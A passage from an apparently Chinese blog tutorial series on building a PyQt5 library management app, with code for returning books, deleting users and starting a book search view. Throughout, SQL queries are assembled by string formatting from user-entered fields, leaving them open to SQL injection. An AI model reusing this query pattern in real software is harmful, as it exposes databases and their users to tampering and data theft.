 self.authNameEdit.setText(query.value(2))</span><br><span class="line">            self.categoryComboBox.setCurrentText(query.value(3))</span><br><span class="line">            self.publisherEdit.setText(query.value(4))</span><br><span class="line">            self.publishTime.setText(query.value(5))</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; borrowBookDialog(&quot;PB15000135&quot;)</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><h3><span id="pshi-xian-xiao-guo">实现效果</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h3><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9bj1uvej308h0c40so.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9blcsuij308e0c7mx4.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9bkucgkj308f0c43yk.jpg" alt="这里写图片描述"></p><h2><span id="pgui-huan-shu-ji-gong-neng-shi-xian">归还书籍功能实现</span><a href="#pgui-huan-shu-ji-gong-neng-shi-xian" class="header-anchor">#</a></h2><h3><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h3><p>一开始的时候被借书功能带偏了，依旧使用了让用户输入书号的方式，但其实使用<code>QComboBox</code>列出已借阅图书让用户选择更好，大家可以自己试试</p><p>实现逻辑如下:</p><ul><li>如果存在借阅记录，就自动匹配书籍信息</li><li>如果输入为空，给出警告</li><li>并未借阅，给出提示</li><li>更新<code>User</code>表，<code>Book</code>表以及<code>User_Book</code>表</li></ul><h3><span id="pshi-xian-dai-ma">实现代码</span><a href="#pshi-xian-dai-ma" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">import time</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class returnBookDialog(QDialog):</span><br><span class="line">    return_book_success_signal&#x3D;pyqtSignal()</span><br><span class="line">    def __init__(self, StudentId, parent&#x3D;None):</span><br><span class="line">        super(returnBookDialog, self).__init__(parent)</span><br><span class="line">        self.studentId &#x3D; StudentId</span><br><span class="line">        self.setUpUI()</span><br><span class="line">        self.setWindowModality(Qt.WindowModal)</span><br><span class="line">        self.setWindowTitle(&quot;归还书籍&quot;)</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        # 书名，书号，作者，分类，添加数量.出版社,出版日期</span><br><span class="line">        # 书籍分类：哲学类、社会科学类、政治类、法律类、军事类、经济类、文化类、教育类、体育类、语言文字类、艺术类、历史类、地理类、天文学类、生物学类、医学卫生类、农业类</span><br><span class="line">        BookCategory &#x3D; [&quot;哲学&quot;, &quot;社会科学&quot;, &quot;政治&quot;, &quot;法律&quot;, &quot;军事&quot;, &quot;经济&quot;, &quot;文化&quot;, &quot;教育&quot;, &quot;体育&quot;, &quot;语言文字&quot;, &quot;艺术&quot;, &quot;历史&quot;</span><br><span class="line">            , &quot;地理&quot;, &quot;天文学&quot;, &quot;生物学&quot;, &quot;医学卫生&quot;, &quot;农业&quot;]</span><br><span class="line">        self.resize(300, 400)</span><br><span class="line">        self.layout &#x3D; QFormLayout()</span><br><span class="line">        self.setLayout(self.layout)</span><br><span class="line"></span><br><span class="line">        # Label控件</span><br><span class="line">        self.returnStudentLabel &#x3D; QLabel(&quot;还 书 人:&quot;)</span><br><span class="line">        self.returnStudentIdLabel &#x3D; QLabel(self.studentId)</span><br><span class="line">        self.titlelabel &#x3D; QLabel(&quot;  归还书籍&quot;)</span><br><span class="line">        self.bookNameLabel &#x3D; QLabel(&quot;书    名:&quot;)</span><br><span class="line">        self.bookIdLabel &#x3D; QLabel(&quot;书    号:&quot;)</span><br><span class="line">        self.authNameLabel &#x3D; QLabel(&quot;作    者:&quot;)</span><br><span class="line">        self.categoryLabel &#x3D; QLabel(&quot;分    类:&quot;)</span><br><span class="line">        self.publisherLabel &#x3D; QLabel(&quot;出 版 社:&quot;)</span><br><span class="line">        self.publishDateLabel &#x3D; QLabel(&quot;出版日期:&quot;)</span><br><span class="line"></span><br><span class="line">        # button控件</span><br><span class="line">        self.returnBookButton &#x3D; QPushButton(&quot;确认归还&quot;)</span><br><span class="line"></span><br><span class="line">        # lineEdit控件</span><br><span class="line">        self.bookNameEdit &#x3D; QLineEdit()</span><br><span class="line">        self.bookIdEdit &#x3D; QLineEdit()</span><br><span class="line">        self.authNameEdit &#x3D; QLineEdit()</span><br><span class="line">        self.categoryComboBox &#x3D; QComboBox()</span><br><span class="line">        self.categoryComboBox.addItems(BookCategory)</span><br><span class="line">        self.publisherEdit &#x3D; QLineEdit()</span><br><span class="line">        self.publishTime &#x3D; QLineEdit()</span><br><span class="line"></span><br><span class="line">        self.bookNameEdit.setMaxLength(10)</span><br><span class="line">        self.bookIdEdit.setMaxLength(6)</span><br><span class="line">        self.authNameEdit.setMaxLength(10)</span><br><span class="line">        self.publisherEdit.setMaxLength(10)</span><br><span class="line"></span><br><span class="line">        # 添加进formlayout</span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.titlelabel)</span><br><span class="line">        self.layout.addRow(self.returnStudentLabel, self.returnStudentIdLabel)</span><br><span class="line">        self.layout.addRow(self.bookNameLabel, self.bookNameEdit)</span><br><span class="line">        self.layout.addRow(self.bookIdLabel, self.bookIdEdit)</span><br><span class="line">        self.layout.addRow(self.authNameLabel, self.authNameEdit)</span><br><span class="line">        self.layout.addRow(self.categoryLabel, self.categoryComboBox)</span><br><span class="line">        self.layout.addRow(self.publisherLabel, self.publisherEdit)</span><br><span class="line">        self.layout.addRow(self.publishDateLabel, self.publishTime)</span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.returnBookButton)</span><br><span class="line"></span><br><span class="line">        # 设置字体</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(20)</span><br><span class="line">        self.titlelabel.setFont(font)</span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.returnStudentIdLabel.setFont(font)</span><br><span class="line">        font.setPixelSize(14)</span><br><span class="line">        self.returnStudentLabel.setFont(font)</span><br><span class="line">        self.bookNameLabel.setFont(font)</span><br><span class="line">        self.bookIdLabel.setFont(font)</span><br><span class="line">        self.authNameLabel.setFont(font)</span><br><span class="line">        self.categoryLabel.setFont(font)</span><br><span class="line">        self.publisherLabel.setFont(font)</span><br><span class="line">        self.publishDateLabel.setFont(font)</span><br><span class="line"></span><br><span class="line">        self.bookNameEdit.setFont(font)</span><br><span class="line">        self.bookNameEdit.setReadOnly(True)</span><br><span class="line">        self.bookNameEdit.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.bookIdEdit.setFont(font)</span><br><span class="line">        self.authNameEdit.setFont(font)</span><br><span class="line">        self.authNameEdit.setReadOnly(True)</span><br><span class="line">        self.authNameEdit.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.publisherEdit.setFont(font)</span><br><span class="line">        self.publisherEdit.setReadOnly(True)</span><br><span class="line">        self.publisherEdit.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.publishTime.setFont(font)</span><br><span class="line">        self.publishTime.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.categoryComboBox.setFont(font)</span><br><span class="line">        self.categoryComboBox.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line"></span><br><span class="line">        # button设置</span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.returnBookButton.setFont(font)</span><br><span class="line">        self.returnBookButton.setFixedHeight(32)</span><br><span class="line">        self.returnBookButton.setFixedWidth(140)</span><br><span class="line"></span><br><span class="line">        # 设置间距</span><br><span class="line">        self.titlelabel.setMargin(8)</span><br><span class="line">        self.layout.setVerticalSpacing(10)</span><br><span class="line">        self.returnBookButton.clicked.connect(self.returnButtonClicked)</span><br><span class="line">        self.bookIdEdit.textChanged.connect(self.bookIdEditChanged)</span><br><span class="line"></span><br><span class="line">    def returnButtonClicked(self):</span><br><span class="line">        # 获取书号，书号为空或并未借阅，则弹出错误</span><br><span class="line">        # 更新Book_User表User表以及Book表</span><br><span class="line">        BookId &#x3D; self.bookIdEdit.text()</span><br><span class="line">        # BookId为空的处理</span><br><span class="line">        if (BookId &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;你所要还的书不存在，请查看输入&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line">        # 打开数据库</span><br><span class="line">        db &#x3D; db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        db.open()</span><br><span class="line">        query &#x3D; QSqlQuery()</span><br><span class="line">        # 如果未借阅</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM User_Book WHERE StudentId&#x3D;&#39;%s&#39; AND BookId&#x3D;&#39;%s&#39; AND BorrowState&#x3D;1&quot; %(self.studentId,BookId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        if (not query.next()):</span><br><span class="line">            print(QMessageBox.information(self, &quot;提示&quot;, &quot;您并未借阅此书，故无需归还&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line">        # 更新User表</span><br><span class="line">        sql &#x3D; &quot;UPDATE User SET NumBorrowed&#x3D;NumBorrowed-1 WHERE StudentId&#x3D;&#39;%s&#39;&quot; % self.studentId</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.commit()</span><br><span class="line">        # 更新Book表</span><br><span class="line">        sql &#x3D; &quot;UPDATE Book SET NumCanBorrow&#x3D;NumCanBorrow+1 WHERE BookId&#x3D;&#39;%s&#39;&quot; % BookId</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.commit()</span><br><span class="line">        # 更新User_Book表</span><br><span class="line">        timenow &#x3D; time.strftime(&#39;%Y-%m-%d&#39;, time.localtime(time.time()))</span><br><span class="line">        sql &#x3D; &quot;UPDATE User_Book SET ReturnTime&#x3D;&#39;%s&#39;,BorrowState&#x3D;0 WHERE StudentId&#x3D;&#39;%s&#39; AND BookId&#x3D;&#39;%s&#39; AND BorrowState&#x3D;1&quot; % (timenow,self.studentId,BookId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.commit()</span><br><span class="line">        print(QMessageBox.information(self, &quot;提示&quot;, &quot;归还成功!&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">        self.return_book_success_signal.emit()</span><br><span class="line">        self.close()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def bookIdEditChanged(self):</span><br><span class="line">        bookId &#x3D; self.bookIdEdit.text()</span><br><span class="line">        if (bookId &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            self.bookNameEdit.clear()</span><br><span class="line">            self.publisherEdit.clear()</span><br><span class="line">            self.authNameEdit.clear()</span><br><span class="line">            self.publishTime.clear()</span><br><span class="line">        db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        db.open()</span><br><span class="line">        query &#x3D; QSqlQuery()</span><br><span class="line">        # 在User_Book表中找借阅记录，如果存在借阅，则更新form内容</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM User_Book WHERE StudentId&#x3D;&#39;%s&#39; AND BookId&#x3D;&#39;%s&#39; AND BorrowState&#x3D;1&quot; % (</span><br><span class="line">            self.studentId, bookId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        if (query.next()):</span><br><span class="line">            # 更新form内容</span><br><span class="line">            sql &#x3D; &quot;SELECT * FROM Book WHERE BookId&#x3D;&#39;%s&#39;&quot; % (bookId)</span><br><span class="line">            query.exec_(sql)</span><br><span class="line">            # 查询对应书号，如果存在就更新form</span><br><span class="line">            if (query.next()):</span><br><span class="line">                self.bookNameEdit.setText(query.value(0))</span><br><span class="line">                self.authNameEdit.setText(query.value(2))</span><br><span class="line">                self.categoryComboBox.setCurrentText(query.value(3))</span><br><span class="line">                self.publisherEdit.setText(query.value(4))</span><br><span class="line">                self.publishTime.setText(query.value(5))</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; returnBookDialog(&quot;PB15000135&quot;)</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><h3><span id="pshi-xian-xiao-guo">实现效果</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h3><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9blse4aj308e0c5748.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9bkdbcgj308e0bz3yh.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9bjfb6vj308g0c6glq.jpg" alt="这里写图片描述"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（7）——用户管理</title>
    <url>/f6234a21.html</url>
    <content><![CDATA[<h2><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h2><p>对于用户管理，本来应该包含添加用户，删除用户等操作的，但是为了实现简单，添加用户就用注册代替了，所以所谓用户管理，只是实现了用户的删除操作</p><p>为了删除用户的同时保护数据库的完整性和约束，需要进行以下操作</p><ul><li>从<code>User</code>表删除该用户</li><li>将该用户所借阅的所有书籍全部归还</li></ul><a id="more"></a><h2><span id="pdai-ma-shi-xian">代码实现</span><a href="#pdai-ma-shi-xian" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line">import time</span><br><span class="line">import sip</span><br><span class="line"></span><br><span class="line">class UserManage(QDialog):</span><br><span class="line">    def __init__(self,parent&#x3D;None):</span><br><span class="line">        super(UserManage, self).__init__(parent)</span><br><span class="line">        self.resize(280, 400)</span><br><span class="line">        self.layout &#x3D; QVBoxLayout()</span><br><span class="line">        self.setLayout(self.layout)</span><br><span class="line">        self.setWindowTitle(&quot;管理用户&quot;)</span><br><span class="line">        # 用户数</span><br><span class="line">        self.userCount &#x3D; 0</span><br><span class="line">        self.oldDeleteId &#x3D; &quot;&quot;</span><br><span class="line">        self.oldDeleteName &#x3D; &quot;&quot;</span><br><span class="line">        self.deleteId &#x3D; &quot;&quot;</span><br><span class="line">        self.deleteName &#x3D; &quot;&quot;</span><br><span class="line">        self.setUpUI()</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        self.db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        self.db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        self.db.open()</span><br><span class="line">        self.query &#x3D; QSqlQuery()</span><br><span class="line">        self.getResult()</span><br><span class="line"></span><br><span class="line">        # 表格设置</span><br><span class="line">        self.tableWidget &#x3D; QTableWidget()</span><br><span class="line">        self.tableWidget.setRowCount(self.userCount)</span><br><span class="line">        self.tableWidget.setColumnCount(2)</span><br><span class="line">        self.tableWidget.setHorizontalHeaderLabels([&#39;学号&#39;, &#39;姓名&#39;])</span><br><span class="line">        # 不可编辑</span><br><span class="line">        self.tableWidget.setEditTriggers(QAbstractItemView.NoEditTriggers)</span><br><span class="line">        # 标题可拉伸</span><br><span class="line">        self.tableWidget.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)</span><br><span class="line">        # 整行选中</span><br><span class="line">        self.tableWidget.setSelectionBehavior(QAbstractItemView.SelectRows)</span><br><span class="line"></span><br><span class="line">        self.layout.addWidget(self.tableWidget)</span><br><span class="line">        self.setRows()</span><br><span class="line">        self.deleteUserButton &#x3D; QPushButton(&quot;删 除 用 户&quot;)</span><br><span class="line">        hlayout &#x3D; QHBoxLayout()</span><br><span class="line">        hlayout.addWidget(self.deleteUserButton, Qt.AlignHCenter)</span><br><span class="line">        self.widget &#x3D; QWidget()</span><br><span class="line">        self.widget.setLayout(hlayout)</span><br><span class="line">        self.widget.setFixedHeight(48)</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(15)</span><br><span class="line">        self.deleteUserButton.setFixedHeight(36)</span><br><span class="line">        self.deleteUserButton.setFixedWidth(180)</span><br><span class="line">        self.deleteUserButton.setFont(font)</span><br><span class="line">        self.layout.addWidget(self.widget, Qt.AlignCenter)</span><br><span class="line">        # 设置信号</span><br><span class="line">        self.deleteUserButton.clicked.connect(self.deleteUser)</span><br><span class="line">        self.tableWidget.itemClicked.connect(self.getStudentInfo)</span><br><span class="line"></span><br><span class="line">    def getResult(self):</span><br><span class="line">        sql &#x3D; &quot;SELECT StudentId,Name FROM User WHERE IsAdmin&#x3D;0&quot;</span><br><span class="line">        self.query.exec_(sql)</span><br><span class="line">        self.userCount &#x3D; 0;</span><br><span class="line">        while (self.query.next()):</span><br><span class="line">            self.userCount +&#x3D; 1;</span><br><span class="line">        sql &#x3D; &quot;SELECT StudentId,Name FROM User WHERE IsAdmin&#x3D;0&quot;</span><br><span class="line">        self.query.exec_(sql)</span><br><span class="line"></span><br><span class="line">    def setRows(self):</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(14)</span><br><span class="line">        for i in range(self.userCount):</span><br><span class="line">            if (self.query.next()):</span><br><span class="line">                StudentIdItem &#x3D; QTableWidgetItem(self.query.value(0))</span><br><span class="line">                StudentNameItem &#x3D; QTableWidgetItem(self.query.value(1))</span><br><span class="line">                StudentIdItem.setFont(font)</span><br><span class="line">                StudentNameItem.setFont(font)</span><br><span class="line">                StudentIdItem.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)</span><br><span class="line">                StudentNameItem.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)</span><br><span class="line">                self.tableWidget.setItem(i, 0, StudentIdItem)</span><br><span class="line">                self.tableWidget.setItem(i, 1, StudentNameItem)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def getStudentInfo(self, item):</span><br><span class="line">        row &#x3D; self.tableWidget.currentIndex().row()</span><br><span class="line">        self.tableWidget.verticalScrollBar().setSliderPosition(row)</span><br><span class="line">        self.getResult()</span><br><span class="line">        i &#x3D; 0</span><br><span class="line">        while (self.query.next() and i !&#x3D; row):</span><br><span class="line">            i &#x3D; i + 1</span><br><span class="line">        self.oldDeleteId &#x3D; self.deleteId</span><br><span class="line">        self.oldDeleteName &#x3D; self.deleteName</span><br><span class="line">        self.deleteId &#x3D; self.query.value(0)</span><br><span class="line">        self.deleteName &#x3D; self.query.value(1)</span><br><span class="line"></span><br><span class="line">    def deleteUser(self):</span><br><span class="line">        if (self.deleteId &#x3D;&#x3D; &quot;&quot; and self.deleteName &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;请选中要删除的用户&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line">        elif (self.deleteId &#x3D;&#x3D; self.oldDeleteId and self.deleteName &#x3D;&#x3D; self.oldDeleteName):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;请选中要删除的用户&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line">        if (QMessageBox.information(self, &quot;提醒&quot;, &quot;删除用户:%s,%s\n用户一经删除将无法恢复，是否继续?&quot; % (self.deleteId, self.deleteName),</span><br><span class="line">                                    QMessageBox.Yes | QMessageBox.No,</span><br><span class="line">                                    QMessageBox.No) &#x3D;&#x3D; QMessageBox.No):</span><br><span class="line">            return</span><br><span class="line">        # 从User表删除用户</span><br><span class="line">        sql &#x3D; &quot;DELETE FROM User WHERE StudentId&#x3D;&#39;%s&#39;&quot; % (self.deleteId)</span><br><span class="line">        self.query.exec_(sql)</span><br><span class="line">        self.db.commit()</span><br><span class="line">        # 归还所有书籍</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM User_Book  WHERE StudentId&#x3D;&#39;%s&#39; AND BorrowState&#x3D;1&quot; % self.deleteId</span><br><span class="line">        self.query.exec_(sql)</span><br><span class="line">        timenow &#x3D; time.strftime(&#39;%Y-%m-%d&#39;, time.localtime(time.time()))</span><br><span class="line">        updateQuery&#x3D;QSqlQuery()</span><br><span class="line">        while (self.query.next()):</span><br><span class="line">            bookId&#x3D;self.query.value(1)</span><br><span class="line">            sql&#x3D;&quot;UPDATE Book SET NumCanBorrow&#x3D;NumCanBorrow+1 WHERE BookId&#x3D;&#39;%s&#39;&quot;% bookId</span><br><span class="line">            updateQuery.exec_(sql)</span><br><span class="line">            self.db.commit()</span><br><span class="line">        sql&#x3D;&quot;UPDATE User_Book SET ReturnTime&#x3D;&#39;%s&#39;,BorrowState&#x3D;0 WHERE StudentId&#x3D;&#39;%s&#39; AND BorrowState&#x3D;1&quot;%(timenow,self.deleteId)</span><br><span class="line">        self.query.exec_(sql)</span><br><span class="line">        self.db.commit()</span><br><span class="line">        print(QMessageBox.information(self,&quot;提醒&quot;,&quot;删除用户成功!&quot;,QMessageBox.Yes,QMessageBox.Yes))</span><br><span class="line">        self.updateUI()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def updateUI(self):</span><br><span class="line">        self.getResult()</span><br><span class="line">        self.layout.removeWidget(self.widget)</span><br><span class="line">        self.layout.removeWidget(self.tableWidget)</span><br><span class="line">        sip.delete(self.widget)</span><br><span class="line">        sip.delete(self.tableWidget)</span><br><span class="line">        # 表格设置</span><br><span class="line">        self.tableWidget &#x3D; QTableWidget()</span><br><span class="line">        self.tableWidget.setRowCount(self.userCount)</span><br><span class="line">        self.tableWidget.setColumnCount(2)</span><br><span class="line">        self.tableWidget.setHorizontalHeaderLabels([&#39;学号&#39;, &#39;姓名&#39;])</span><br><span class="line">        # 不可编辑</span><br><span class="line">        self.tableWidget.setEditTriggers(QAbstractItemView.NoEditTriggers)</span><br><span class="line">        # 标题可拉伸</span><br><span class="line">        self.tableWidget.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)</span><br><span class="line">        # 整行选中</span><br><span class="line">        self.tableWidget.setSelectionBehavior(QAbstractItemView.SelectRows)</span><br><span class="line"></span><br><span class="line">        self.layout.addWidget(self.tableWidget)</span><br><span class="line">        self.setRows()</span><br><span class="line">        self.deleteUserButton &#x3D; QPushButton(&quot;删 除 用 户&quot;)</span><br><span class="line">        hlayout &#x3D; QHBoxLayout()</span><br><span class="line">        hlayout.addWidget(self.deleteUserButton, Qt.AlignHCenter)</span><br><span class="line">        self.widget &#x3D; QWidget()</span><br><span class="line">        self.widget.setLayout(hlayout)</span><br><span class="line">        self.widget.setFixedHeight(48)</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(15)</span><br><span class="line">        self.deleteUserButton.setFixedHeight(36)</span><br><span class="line">        self.deleteUserButton.setFixedWidth(180)</span><br><span class="line">        self.deleteUserButton.setFont(font)</span><br><span class="line">        self.layout.addWidget(self.widget, Qt.AlignCenter)</span><br><span class="line">        # 设置信号</span><br><span class="line">        self.deleteUserButton.clicked.connect(self.deleteUser)</span><br><span class="line">        self.tableWidget.itemClicked.connect(self.getStudentInfo)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; UserManage()</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><h2><span id="pdai-ma-fen-xi">代码分析</span><a href="#pdai-ma-fen-xi" class="header-anchor">#</a></h2><p>这里使用	<code>QtableWidget</code>来展示当前所有的用户的学号以及姓名<br>步骤如下：</p><ul><li>展示所有用户</li><li>管理员选中一行</li><li>点击删除用户</li><li>提醒时候确认删除</li><li>删除，同时刷新展示的数据</li></ul><h2><span id="pshi-xian-xiao-guo">实现效果</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h2><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb94es1dfj307w0c2748.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb94e5jjxj307u0c20su.jpg" alt="这里写图片描述"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（6）——书籍信息查询实现</title>
    <url>/ec62120c.html</url>
    <content><![CDATA[<h2><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h2><p>从数据库的设计可以看到，在这里我们只需要使用Book表的数据，就可以实现书籍信息的查询了</p><p>在这个功能的实现上，可以说花了我比较大的心思了，主要实现了这些功能：</p><ul><li>动态刷新，也就是说当管理员删除或者添加书籍，用户借阅归还书籍的时候动态刷新这个TableView</li><li>模糊匹配</li><li>按书名，作者，书号，出版社查询</li><li>跳转页，翻页</li></ul><a id="more"></a><h2><span id="pdai-ma-shi-xian">代码实现</span><a href="#pdai-ma-shi-xian" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import Qt</span><br><span class="line">import qdarkstyle</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class BookStorageViewer(QWidget):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        super(BookStorageViewer, self).__init__()</span><br><span class="line">        self.resize(700, 500)</span><br><span class="line">        self.setWindowTitle(&quot;欢迎使用图书馆管理系统&quot;)</span><br><span class="line">        # 查询模型</span><br><span class="line">        self.queryModel &#x3D; None</span><br><span class="line">        # 数据表</span><br><span class="line">        self.tableView &#x3D; None</span><br><span class="line">        # 当前页</span><br><span class="line">        self.currentPage &#x3D; 0</span><br><span class="line">        # 总页数</span><br><span class="line">        self.totalPage &#x3D; 0</span><br><span class="line">        # 总记录数</span><br><span class="line">        self.totalRecord &#x3D; 0</span><br><span class="line">        # 每页数据数</span><br><span class="line">        self.pageRecord &#x3D; 10</span><br><span class="line">        self.setUpUI()</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        self.layout &#x3D; QVBoxLayout()</span><br><span class="line">        self.Hlayout1 &#x3D; QHBoxLayout()</span><br><span class="line">        self.Hlayout2 &#x3D; QHBoxLayout()</span><br><span class="line"></span><br><span class="line">        # Hlayout1控件的初始化</span><br><span class="line">        self.searchEdit &#x3D; QLineEdit()</span><br><span class="line">        self.searchEdit.setFixedHeight(32)</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(15)</span><br><span class="line">        self.searchEdit.setFont(font)</span><br><span class="line"></span><br><span class="line">        self.searchButton &#x3D; QPushButton(&quot;查询&quot;)</span><br><span class="line">        self.searchButton.setFixedHeight(32)</span><br><span class="line">        self.searchButton.setFont(font)</span><br><span class="line">        self.searchButton.setIcon(QIcon(QPixmap(&quot;.&#x2F;images&#x2F;search.png&quot;)))</span><br><span class="line"></span><br><span class="line">        self.condisionComboBox &#x3D; QComboBox()</span><br><span class="line">        searchCondision &#x3D; [&#39;按书名查询&#39;, &#39;按书号查询&#39;, &#39;按作者查询&#39;, &#39;按分类查询&#39;, 